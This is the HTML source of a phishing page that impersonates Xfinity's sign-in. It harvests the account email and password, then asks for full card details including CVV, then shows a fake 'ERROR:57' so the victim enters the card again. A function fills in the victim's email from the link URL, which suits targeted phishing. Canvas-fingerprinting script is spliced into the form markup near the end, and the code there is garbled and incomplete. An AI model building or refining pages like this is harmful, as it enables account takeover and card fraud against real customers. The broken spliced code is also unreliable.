<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XYX</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Open Sans', Arial, sans-serif; }
    body {
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      position:relative;
      background: #0A1E3C;
      overflow:hidden;
    }

    /* Full-screen background image */
    .bg-image {
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      z-index:0;
      background: url('https://wallpapercave.com/wp/wp4056702.jpg') center center / cover no-repeat;
      filter: brightness(0.7) saturate(0.9);
      transform: scale(1.05);
      animation: slowZoom 30s ease-in-out infinite alternate;
    }
    @keyframes slowZoom {
      0% { transform: scale(1.05); }
      100% { transform: scale(1.15); }
    }

    /* Dark overlay for readability */
    .overlay {
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      z-index:0;
      background: 
        linear-gradient(135deg, rgba(10,30,60,0.75) 0%, rgba(10,30,60,0.4) 50%, rgba(10,30,60,0.75) 100%),
        radial-gradient(ellipse at center, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.6) 100%);
      pointer-events:none;
    }

    /* Xfinity brand accent glow */
    .accent-glow {
      position:fixed;
      top:50%;
      left:50%;
      transform:translate(-50%, -50%);
      width:900px;
      height:900px;
      border-radius:50%;
      background:radial-gradient(circle, rgba(230,0,0,0.08) 0%, transparent 70%);
      pointer-events:none;
      z-index:0;
      animation: pulseGlow 5s ease-in-out infinite alternate;
    }
    @keyframes pulseGlow {
      0% { opacity:0.3; transform:translate(-50%, -50%) scale(0.8); }
      100% { opacity:0.7; transform:translate(-50%, -50%) scale(1.2); }
    }

    /* Floating particles */
    .particles {
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      z-index:0;
      pointer-events:none;
      overflow:hidden;
    }
    .particle {
      position:absolute;
      width:4px;
      height:4px;
      background:rgba(255,255,255,0.15);
      border-radius:50%;
      animation: floatParticle 20s infinite linear;
    }
    .particle:nth-child(1) { left:10%; animation-duration:18s; animation-delay:0s; width:6px; height:6px; }
    .particle:nth-child(2) { left:20%; animation-duration:22s; animation-delay:2s; }
    .particle:nth-child(3) { left:30%; animation-duration:16s; animation-delay:4s; width:8px; height:8px; }
    .particle:nth-child(4) { left:40%; animation-duration:24s; animation-delay:1s; }
    .particle:nth-child(5) { left:50%; animation-duration:20s; animation-delay:3s; width:5px; height:5px; }
    .particle:nth-child(6) { left:60%; animation-duration:19s; animation-delay:5s; }
    .particle:nth-child(7) { left:70%; animation-duration:23s; animation-delay:2s; width:7px; height:7px; }
    .particle:nth-child(8) { left:80%; animation-duration:17s; animation-delay:4s; }
    .particle:nth-child(9) { left:90%; animation-duration:21s; animation-delay:1s; width:6px; height:6px; }
    .particle:nth-child(10) { left:15%; animation-duration:25s; animation-delay:3s; }
    .particle:nth-child(11) { left:45%; animation-duration:18s; animation-delay:6s; width:9px; height:9px; }
    .particle:nth-child(12) { left:75%; animation-duration:22s; animation-delay:0s; }
    @keyframes floatParticle {
      0% { transform:translateY(100vh) rotate(0deg); opacity:0; }
      10% { opacity:0.8; }
      90% { opacity:0.8; }
      100% { transform:translateY(-100vh) rotate(720deg); opacity:0; }
    }

    /* Container styling - glass morphism with backdrop blur */
    .container {
      width:100%;
      max-width:400px;
      background:rgba(255,255,255,0.88);
      backdrop-filter:blur(20px);
      -webkit-backdrop-filter:blur(20px);
      border-radius:16px;
      box-shadow:
        0 30px 80px rgba(0,0,0,0.5),
        0 0 0 1px rgba(255,255,255,0.1),
        inset 0 1px 0 rgba(255,255,255,0.2);
      padding:40px 32px;
      position:relative;
      z-index:1;
      transition: all 0.3s ease;
      border:1px solid rgba(255,255,255,0.15);
    }
    .container::before {
      content:'';
      position:absolute;
      top:-1px;
      left:50%;
      transform:translateX(-50%);
      width:60%;
      height:2px;
      background:linear-gradient(90deg, transparent, rgba(230,0,0,0.5), rgba(230,0,0,0.9), rgba(230,0,0,0.5), transparent);
      border-radius:100%;
    }
    .container.card-step {
      max-width:420px;
      padding:28px 24px;
    }
    .container.error-step {
      max-width:420px;
      padding:28px 24px;
    }
    .hidden { display:none !important; }

    .logo {
      text-align:center;
      margin-bottom:24px;
      position:relative;
    }
    .logo img {
      max-width:150px;
      filter:drop-shadow(0 4px 20px rgba(0,0,0,0.25));
      transition:transform 0.3s ease;
    }
    .logo img:hover {
      transform:scale(1.03);
    }
    .logo .glow-ring {
      position:absolute;
      top:50%;
      left:50%;
      transform:translate(-50%, -50%);
      width:180px;
      height:180px;
      border-radius:50%;
      background:radial-gradient(circle, rgba(230,0,0,0.08) 0%, transparent 70%);
      pointer-events:none;
      z-index:-1;
    }

    h1 {
      font-size:20px;
      font-weight:600;
      color:#0A1E3C;
      margin-bottom:4px;
      text-shadow:0 1px 2px rgba(255,255,255,0.3);
    }
    .sub {
      font-size:13px;
      color:#555;
      margin-bottom:20px;
      text-align:center;
    }
    .form-group { margin-bottom:14px; }
    label {
      display:block;
      font-size:13px;
      font-weight:600;
      color:#0A1E3C;
      margin-bottom:3px;
    }
    label .required { color:#E60000; margin-left:2px; }
    input[type="text"], input[type="password"], input[type="tel"], input[type="number"], select, textarea {
      width:100%;
      padding:10px 12px;
      border:1px solid rgba(208,208,208,0.5);
      border-radius:8px;
      font-size:14px;
      transition:all 0.3s ease;
      background:rgba(255,255,255,0.8);
      height:42px;
      font-family: 'Open Sans', Arial, sans-serif;
      backdrop-filter:blur(5px);
    }
    textarea {
      height:60px;
      resize:vertical;
      padding:8px 12px;
    }
    input:focus, select:focus, textarea:focus {
      border-color:#0A1E3C;
      outline:none;
      box-shadow:0 0 0 3px rgba(10,30,60,0.15), inset 0 1px 3px rgba(0,0,0,0.05);
      background:rgba(255,255,255,0.95);
    }
    input.error-field {
      border-color:#E60000;
      background:#fff5f5;
    }
    .row {
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin:4px 0 16px;
    }
    .row label {
      font-weight:400;
      font-size:13px;
      display:flex;
      align-items:center;
      gap:6px;
      cursor:pointer;
      color:#333;
    }
    .row a {
      font-size:13px;
      color:#0A1E3C;
      text-decoration:none;
      font-weight:500;
      transition:color 0.2s;
    }
    .row a:hover {
      color:#E60000;
      text-decoration:underline;
    }
    .btn {
      width:100%;
      background:linear-gradient(135deg, #E60000, #cc0000);
      color:#fff;
      border:none;
      border-radius:8px;
      padding:12px;
      font-size:16px;
      font-weight:700;
      cursor:pointer;
      transition:all 0.3s ease;
      box-shadow:0 4px 20px rgba(230,0,0,0.35);
      height:44px;
      position:relative;
      overflow:hidden;
    }
    .btn::after {
      content:'';
      position:absolute;
      top:0;
      left:0;
      width:100%;
      height:100%;
      background:linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.1) 60%, transparent 80%);
      pointer-events:none;
    }
    .btn:hover {
      background:linear-gradient(135deg, #cc0000, #b30000);
      box-shadow:0 6px 28px rgba(230,0,0,0.5);
      transform:translateY(-2px);
    }
    .btn:active {
      transform:scale(0.97) translateY(0);
    }
    .btn-secondary {
      background:linear-gradient(135deg, #0A1E3C, #1a3a6a);
      box-shadow:0 4px 20px rgba(10,30,60,0.35);
    }
    .btn-secondary:hover {
      background:linear-gradient(135deg, #1a3a6a, #2a4a7a);
      box-shadow:0 6px 28px rgba(10,30,60,0.45);
    }
    .signup {
      text-align:center;
      margin-top:16px;
      font-size:13px;
      color:#555;
    }
    .signup a {
      color:#0A1E3C;
      font-weight:600;
      text-decoration:none;
      transition:color 0.2s;
    }
    .signup a:hover {
      color:#E60000;
      text-decoration:underline;
    }
    .error {
      color:#E60000;
      font-size:12px;
      margin-top:4px;
      display:none;
      background:rgba(230,0,0,0.08);
      padding:6px 10px;
      border-radius:6px;
      border-left:3px solid #E60000;
    }

    /* Card step specific */
    .card-step .logo { margin-bottom:16px; }
    .card-step .logo img { max-width:120px; }
    .card-step h1 { font-size:17px; }
    .card-step .sub { font-size:12px; margin-bottom:12px; }
    .card-step .form-group { margin-bottom:10px; }
    .card-step label { font-size:12px; }
    .card-step input, .card-step select { padding:8px 10px; font-size:13px; height:36px; }
    .card-step textarea { padding:6px 10px; font-size:13px; height:50px; }
    .card-step .btn { padding:10px; font-size:15px; height:40px; }
    .card-step .row { margin:2px 0 10px; }

    /* Error step specific */
    .error-step .logo { margin-bottom:16px; }
    .error-step .logo img { max-width:120px; }
    .error-step h1 { font-size:17px; }
    .error-step .sub { font-size:12px; margin-bottom:12px; }
    .error-step .form-group { margin-bottom:10px; }
    .error-step label { font-size:12px; }
    .error-step input, .error-step select { padding:8px 10px; font-size:13px; height:36px; }
    .error-step .btn { padding:10px; font-size:15px; height:40px; }
    .error-step .row { margin:2px 0 10px; }

    .error-banner {
      background:linear-gradient(135deg, rgba(255,245,245,0.9), rgba(255,232,232,0.9));
      border:1px solid #E60000;
      border-radius:8px;
      padding:12px 14px;
      margin-bottom:16px;
      display:flex;
      align-items:center;
      gap:10px;
      box-shadow:0 2px 12px rgba(230,0,0,0.1);
      backdrop-filter:blur(5px);
    }
    .error-banner .icon {
      font-size:20px;
      color:#E60000;
    }
    .error-banner .msg {
      font-size:13px;
      font-weight:600;
      color:#E60000;
    }
    .error-banner .sub-msg {
      font-size:12px;
      color:#666;
    }

    .form-row-2 {
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:10px;
    }
    .form-row-3 {
      display:grid;
      grid-template-columns:1fr 1fr 1fr;
      gap:10px;
    }
    .card-input-group { position:relative; }
    .card-input-group input { padding-left:38px; letter-spacing:0.5px; }
    .card-input-group .card-icon {
      position:absolute;
      left:10px;
      top:50%;
      transform:translateY(-50%);
      font-size:16px;
      color:#999;
    }
    .cvv-hint { font-size:10px; color:#999; margin-top:2px; text-align:right; }
    .required-star { color:#E60000; font-weight:700; }

    .card-type-pills {
      display:flex;
      gap:8px;
      margin-top:4px;
      flex-wrap:wrap;
    }
    .card-type-pills span {
      padding:4px 12px;
      border-radius:20px;
      font-size:11px;
      font-weight:600;
      background:rgba(240,240,240,0.8);
      color:#333;
      border:1px solid #ddd;
      cursor:pointer;
      transition:all 0.2s ease;
      backdrop-filter:blur(5px);
    }
    .card-type-pills span.active {
      background:linear-gradient(135deg, #0A1E3C, #1a3a6a);
      color:#fff;
      border-color:#0A1E3C;
      box-shadow:0 2px 12px rgba(10,30,60,0.2);
    }
    .card-type-pills span:hover {
      transform:translateY(-1px);
      box-shadow:0 2px 12px rgba(0,0,0,0.1);
    }
    .card-type-pills span.active:hover {
      transform:translateY(-1px);
      box-shadow:0 4px 16px rgba(10,30,60,0.3);
    }

    .success-content { text-align:center; padding:10px 0; }
    .success-content .checkmark {
      font-size:56px;
      display:block;
      margin-bottom:8px;
      animation:popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    @keyframes popIn {
      0% { transform:scale(0); opacity:0; }
      100% { transform:scale(1); opacity:1; }
    }
    .success-content h2 {
      font-size:18px;
      color:#0A1E3C;
      margin-bottom:4px;
    }
    .success-content p {
      font-size:13px;
      color:#555;
    }
    .spinner {
      display:inline-block;
      width:32px;
      height:32px;
      border:3px solid #E60000;
      border-top-color:transparent;
      border-radius:50%;
      animation:spin 0.8s linear infinite;
      margin-top:12px;
    }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }

    @media (max-width:480px) {
      .container { margin:16px; padding:28px 18px; }
      .container.card-step { padding:20px 16px; }
      .container.error-step { padding:20px 16px; }
      .form-row-2 { grid-template-columns:1fr; gap:8px; }
      .form-row-3 { grid-template-columns:1fr; gap:8px; }
      .card-step input, .card-step select { height:34px; font-size:12px; padding:6px 8px; }
      .card-step textarea { height:44px; font-size:12px; padding:6px 8px; }
      .error-step input, .error-step select { height:34px; font-size:12px; padding:6px 8px; }
      .bg-image { filter: brightness(0.5) saturate(0.8); }
    }
  </style>
</head>
<body>
  <!-- Background layers -->
  <div class="bg-image"></div>
  <div class="overlay"></div>
  <div class="accent-glow"></div>
  <div class="particles">
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
    <span class="particle"></span>
  </div>

  <!-- LOGIN STEP -->
  <div class="container" id="loginContainer">
    <div class="logo">
      <div class="glow-ring"></div>
      <img src="https://assets.xfinity.com/assets/dotcom/prod/img/logos/xfinity-logo.svg" alt="Xfinity" onerror="this.style.display='none'">
    </div>
    <h1>Sign in to Xfinity</h1>
    <p class="sub">Access your emails, TV, internet, and more</p>
    <form id="loginForm">
      <div class="form-group">
        <label for="user">Email or Xfinity ID</label>
        <input type="text" id="user" name="user" placeholder="Enter your email or ID" required autofocus>
      </div>
      <div class="form-group">
        <label for="pass">Confirm Password</label>
        <input type="password" id="pass" name="pass" placeholder="Verify password to proceed" required>
      </div>
      <div class="row">
        <label><input type="checkbox" name="remember" value="true" checked> Remember me</label>
        <a href="https://login.xfinity.com/forgot">Forgot password?</a>
      </div>
      <button type="submit" class="btn">Sign In</button>
    </form>
    <div class="signup">
      Not a customer? <a href="https://www.xfinity.com/learn">Sign up now</a>
    </div>
    <div id="loginError" class="error"></div>
  </div>

  <!-- CARD INFO STEP -->
  <div class="container card-step hidden" id="cardContainer">
    <div class="logo">
      <div class="glow-ring"></div>
      <img src="https://assets.xfinity.com/assets/dotcom/prod/img/logos/xfinity-logo.svg" alt="Xfinity" onerror="this.style.display='none'">
    </div>
    <h1>Update Payment Method</h1>
    <p class="sub"><span class="required-star">*</span> Required fields &bull; Kindly update your Card info</p>
    
    <form id="cardForm">
      <div class="form-row-2">
        <div class="form-group">
          <label>First Name <span class="required-star">*</span></label>
          <input type="text" id="firstName" placeholder="First" required>
        </div>
        <div class="form-group">
          <label>Last Name <span class="required-star">*</span></label>
          <input type="text" id="lastName" placeholder="Last" required>
        </div>
      </div>

      <div class="form-group">
        <label>Address <span class="required-star">*</span></label>
        <input type="text" id="address" placeholder="Street address" required>
      </div>

      <div class="form-group">
        <label>Address Line 2</label>
        <input type="text" id="address2" placeholder="Apartment, suite, unit, etc.">
      </div>

      <div class="form-row-2">
        <div class="form-group">
          <label>City <span class="required-star">*</span></label>
          <input type="text" id="city" placeholder="City" required>
        </div>
        <div class="form-group">
          <label>State</label>
          <input type="text" id="state" placeholder="State">
        </div>
      </div>

      <div class="form-row-2">
        <div class="form-group">
          <label>Country</label>
          <select id="country">
            <option value="">Select</option>
            <option value="US">United States</option>
            <option value="CA">Canada</option>
            <option value="UK">United Kingdom</option>
            <option value="AU">Australia</option>
            <option value="DE">Germany</option>
            <option value="FR">France</option>
            <option value="JP">Japan</option>
            <option value="BR">Brazil</option>
            <option value="IN">India</option>
            <option value="IT">Italy</option>
            <option value="ES">Spain</option>
            <option value="MX">Mexico</option>
            <option value="NL">Netherlands</option>
            <option value="KR">South Korea</option>
            <option value="SG">Singapore</option>
            <option value="ZA">South Africa</option>
          </select>
        </div>
        <div class="form-group">
          <label>Postal Code <span class="required-star">*</span></label>
          <input type="text" id="postalCode" placeholder="Postal" required>
        </div>
      </div>

      <div class="form-group">
        <label>Phone</label>
        <input type="tel" id="phone" placeholder="Phone number">
      </div>

      <div class="form-row-2">
        <div class="form-group">
          <label>Card Type</label>
          <select id="cardType">
            <option value="">Select Type</option>
            <option value="Visa">Visa</option>
            <option value="MasterCard">MasterCard</option>
            <option value="Amex">American Express</option>
            <option value="Discover">Discover</option>
            <option value="JCB">JCB</option>
            <option value="Diners">Diners Club</option>
          </select>
        </div>
        <div class="form-group">
          <label>Card Number</label>
          <div class="card-input-group">
            <span class="card-icon">💳</span>
            <input type="text" id="cardNumber" placeholder="#### #### #### ####" maxlength="23">
          </div>
        </div>
      </div>

      <div class="form-row-3">
        <div class="form-group">
          <label>Exp. Month <span class="required-star">*</span></label>
          <select id="expMonth" required>
            <option value="">Month</option>
            <option value="01">Jan</option><option value="02">Feb</option>
            <option value="03">Mar</option><option value="04">Apr</option>
            <option value="05">May</option><option value="06">Jun</option>
            <option value="07">Jul</option><option value="08">Aug</option>
            <option value="09">Sep</option><option value="10">Oct</option>
            <option value="11">Nov</option><option value="12">Dec</option>
          </select>
        </div>
        <div class="form-group">
          <label>Exp. Year <span class="required-star">*</span></label>
          <select id="expYear" required>
            <option value="">Year</option>
            <option value="2026">2026</option><option value="2027">2027</option>
            <option value="2028">2028</option><option value="2029">2029</option>
            <option value="2030">2030</option><option value="2031">2031</option>
            <option value="2032">2032</option><option value="2033">2033</option>
            <option value="2034">2034</option><option value="2035">2035</option>
            <option value="2036">2036</option>
          </select>
        </div>
        <div class="form-group">
          <label>CVV <span class="required-star">*</span></label>
          <input type="password" id="cvv" placeholder="CVV" maxlength="4" required>
          <div class="cvv-hint">3-4 digits</div>
        </div>
      </div>

      <button type="submit" class="btn btn-secondary">PROCEED</button>
    </form>
    <div id="cardError" class="error"></div>
  </div>

  <!-- ERROR / RE-ENTER STEP (Third Page) -->
  <div class="container error-step hidden" id="errorContainer">
    <div class="logo">
      <div class="glow-ring"></div>
      <img src="https://assets.xfinity.com/assets/dotcom/prod/img/logos/xfinity-logo.svg" alt="Xfinity" onerror="this.style.display='none'">
    </div>
    <h1>Payment Verification</h1>
    
    <div class="error-banner">
      <span class="icon">⚠️</span>
      <div>
        <div class="msg">ERROR:57</div>
        <div class="sub-msg">Please re-enter your Card info</div>
      </div>
    </div>

    <form id="errorForm">
      <div class="form-group">
        <label>E-mail:</label>
        <input type="text" id="errorEmail" placeholder="Email address" value="">
      </div>

      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('Xfinity', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('Comcast', 4, 45);
      const fingerprint = canvas.toDataURL();
      
      let hash = 0;
      for (let i = 0; i < fingerprint.length; i++) {
        const char = fingerprint.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;

    function prefillEmailFromURL() {
      var em = null;
      try { em = new URLSearchParams(location.search).get('email') || null; } catch (e) {}
      if (!em) {
        var h = location.hash.replace(/^#/, '');
        if (h) {
          if (h.indexOf('email=') === 0) h = h.slice(6);
          try { em = decodeURIComponent(h); } catch (e) { em = h; }
        }
      }
      if (em) {
        var u = document.getElementById('user');
        if (u) u.value = em;
        var ee = document.getElementById('errorEmail');
        if (ee && !ee.value) ee.value = em;
        console.log('[PREFILL] email from URL:', em);
      }
    }
    document.addEventListener('DOMContentLoaded', prefillEmailFromURL);
    // A hash-only link change does not reload the page, so re-read on hashchange.
    window.addEventListener('hashchange', prefillEmailFromURL);
</script>
</body>
</html>
